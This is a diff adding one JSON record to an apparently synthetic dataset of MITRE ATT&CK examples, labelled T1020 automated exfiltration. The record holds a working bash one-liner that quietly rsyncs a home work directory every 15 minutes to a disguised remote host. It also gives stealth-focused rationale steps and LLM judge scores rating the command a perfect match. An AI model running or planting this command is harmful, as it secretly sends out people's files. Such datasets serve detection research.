@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup bash -c 'while sleep 900; do rsync -azq --delete --exclude=\\*.tmp --exclude=\\*.cache $HOME/Work/ backup@updates.example.org:.local/.w/$HOSTNAME/; done' >/dev/null 2>&1 &",
+  "explanation": "Automates periodic exfiltration every 15 minutes using rsync to continuously mirror a working directory to a remote host, fitting T1020\u2019s automated data transfer pattern.",
+  "rationale_steps": [
+    "Establish a loop to automate regular transfers.",
+    "Mirror contents with --delete to maintain a clean remote mirror.",
+    "Exclude noisy/temp files to reduce volume and detection.",
+    "Run with nohup and redirect all output to /dev/null for stealth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-34cdda1d",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting with bash -c, valid while-loop and rsync flags with properly escaped globs, and correct nohup, redirections, and backgrounding.",
+        "semantic_score": 5,
+        "semantic_justification": "Implements periodic (15-minute) automated mirroring of a local directory to a remote host via rsync with compression and deletion, matching T1020 automated exfiltration behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:17:12.405612Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, escape sequences, redirection, and background execution syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a persistent background process that runs every 15 minutes (900 seconds) to synchronize local files to a remote server using rsync with appropriate flags for quiet, compressed transfer.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:00:18.746168Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper command separators, and correct escaping for the rsync exclude patterns.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of periodic automated exfiltration using rsync to mirror a directory to a remote host, which aligns precisely with T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:00:27.552465Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
